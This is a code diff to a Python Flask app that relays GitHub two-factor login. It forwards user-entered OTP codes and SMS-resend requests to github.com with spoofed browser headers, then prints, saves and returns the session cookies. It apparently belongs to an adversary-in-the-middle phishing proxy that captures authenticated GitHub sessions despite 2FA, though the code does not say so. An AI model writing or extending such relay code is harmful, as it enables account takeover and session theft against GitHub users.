@@ -122,15 +122,51 @@ def perform_2fa():
 
     return response.text
 
+def forward_sms():
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
+        "Accept": "text/html,application/xhtml+xml,application/json",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3",
+        "Referer": "https://github.com/sessions/two-factor/webauthn",
+        "Origin": "https://github.com",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "Turbo-Visit": "true",
+        "X-React-App-Name": "rails",
+    }
 
-def execute_2fa(app_otp: int):
+    # Ensure req_session has been authenticated successfully before this call
+    print("Session cookies:", req_session.cookies.get_dict())
+
+    response = req_session.get(
+        "https://github.com/sessions/two-factor/sms/confirm", headers=headers
+    )
+    save_cookies_to_file()
+
+    # Check if we got a proper HTML response or if it's a redirect or error page
+    if response.status_code != 200:
+        print("Error: Received status code", response.status_code)
+        return f"Error: {response.status_code}"
+
+    # Parse the response to update the authenticity_token if needed
+    soup = BeautifulSoup(response.text, "html.parser")
+    token_input = soup.find("input", {"name": "authenticity_token"})
+    if token_input and token_input.has_attr("value"):
+        flask_session["authenticity_token"] = token_input["value"]
+
+    return response.text
+
+
+def execute_2fa_otp(app_otp: int, field_name:str):
     token = flask_session.get("authenticity_token")
     if not token:
         return "Missing authenticity token.", "error"
 
     payload = {
         "authenticity_token": token,
-        "app_otp": app_otp,
+        field_name: app_otp,
         "webauthn-support": "supported",
         "webauthn-iuvpaa-support": "unsupported",
         "return_to": "",
@@ -154,3 +190,33 @@ def execute_2fa(app_otp: int):
         return html, "failure", req_session.cookies.get_dict()
     else:
         return html, "unknown", req_session.cookies.get_dict()
+
+
+def send_sms(authenticity_token, resend):
+    # Forward the request to GitHub
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
+        "Accept": "text/html,application/xhtml+xml,application/json",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3",
+        "Referer": "https://github.com/sessions/two-factor/sms/confirm",
+        "Origin": "https://github.com",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+    }
+
+    payload = {
+        "authenticity_token": authenticity_token,
+        "resend": resend,
+    }
+
+    response = req_session.post(
+        "https://github.com/sessions/two-factor/sms/confirm",
+        headers=headers,
+        data=payload,
+    )
+
+    # Save cookies after forwarding the request
+    save_cookies_to_file()
+    return response.text
